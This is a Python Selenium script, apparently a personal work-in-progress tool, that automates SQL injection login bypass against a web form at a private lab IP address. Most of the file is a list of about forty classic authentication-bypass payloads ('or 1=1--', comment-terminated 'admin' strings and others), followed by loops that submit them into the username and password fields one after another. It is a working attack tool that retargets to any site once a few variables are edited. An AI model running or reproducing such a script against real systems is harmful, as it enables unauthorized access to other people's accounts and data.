# This script is used for basic SQL injection on login/password screens.
# It is a work in progress
# Written by David Odza

from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException
import time

################## YOU'LL CHANGE THE CHROME DRIVER PATH TO YOUR OWN ##################
#setting path to chrome driver
chrome_path = r"C:\Users\David\Downloads\chromedriver_win32\chromedriver.exe"
################## END OF CHROME DRIVER PATH CHANGE ##################
driver = webdriver.Chrome(chrome_path)

url = "http://192.168.226.128/?page=login"
driver.get(url)

################## YOU'LL CHANGE THE 3 VARIABLES BELOW ##################
#login input XPath 
loginX = """//*[@id="user"]"""
#password input XPath
passX = """//*[@id="pass"]"""
#login button XPath
loginButtonX = """/html/body/center/form/input[3]"""
################## END OF VARIABLES TO CHANGE ##################

quote = '"'

simpleSQL = [
    """admin' or 1=1""",
    """admin' --""",
    """admin' #""",
    """admin'/*""",
    """' or 1=1--""",
    """' or 1=1#""",
    """' or 1=1/*""",
    """') or '1'='1--""",
    """') or ('1'='1--""",
    """' or ''='""",
    """'-'""",    
    """' '""",
    """'&'""",
    """'^'""",
    """'*'""",
    """' or ''-'""",
    """' or '' '""",
    """' or ''&'""",
    """' or ''^'""",
    """' or ''*'""",
    quote + "-" + quote,   
    quote + " " + quote,   
    quote + "&" + quote,   
    quote + "^" + quote,   
    quote + "*" + quote,   
    quote + " or " + quote + quote + "-" + quote,
    quote + " or " + quote + quote + " " + quote,
    quote + " or " + quote + quote + "&" + quote,
    quote + " or " + quote + quote + "^" + quote,
    quote + " or " + quote + quote + "*" + quote,
    """or true--""",
    """" or true--""",
    """' or true--""",
    """") or true--""",
    """') or true--""",
    """' or 'x'='x""",
    """') or ('x')=('x""",
    """')) or (('x'))=(('x""",
    quote + " or " + quote + "x" + quote + "=" + quote + "x",
    quote + ") or (" + quote + "x" + quote + ")=(" + quote + "x",
    quote + ")) or ((" + quote + "x" + quote + "))=((" + quote + "x"
    ]

logins = [
    "admin",
    "Admin"
    ]

#username and password
for SQL in simpleSQL:
    driver.get(url)
    loginInput = driver.find_element_by_xpath(loginX)
    loginInput.send_keys(SQL)

    pwInput = driver.find_element_by_xpath(passX)
    pwInput.send_keys(SQL)

    print ("Trying User & PW = " + SQL)    
    driver.find_element_by_xpath(loginButtonX).click()
    #Second click should stop script on success b/c button not found
    #driver.find_element_by_xpath(loginButtonX).click()

#only username
for SQL in simpleSQL:
    driver.get(url)
    loginInput = driver.find_element_by_xpath(loginX)
    loginInput.send_keys(SQL)

    print ("Trying User = " + SQL)
    driver.find_element_by_xpath(loginButtonX).click()
    #Second click should stop script on success b/c button not found
    #driver.find_element_by_xpath(loginButtonX).click()

#only password
for SQL in simpleSQL:
    driver.get(url)    

    pwInput = driver.find_element_by_xpath(passX)
    pwInput.send_keys(SQL)
    print ("Trying PW = " + SQL)
    driver.find_element_by_xpath(loginButtonX).click()
    #Second click should stop script on success b/c button not found
    #driver.find_element_by_xpath(loginButtonX).click()

#only password
for SQL in simpleSQL:
    for login in logins:
        driver.get(url)
        
        loginInput = driver.find_element_by_xpath(loginX)
        loginInput.send_keys(login) 

        pwInput = driver.find_element_by_xpath(passX)
        pwInput.send_keys(SQL)
        print ("Trying User = " + login + "& PW = " + SQL)
        driver.find_element_by_xpath(loginButtonX).click()
        #Second click should stop script on success b/c button not found
        #driver.find_element_by_xpath(loginButtonX).click()


    
print("done")
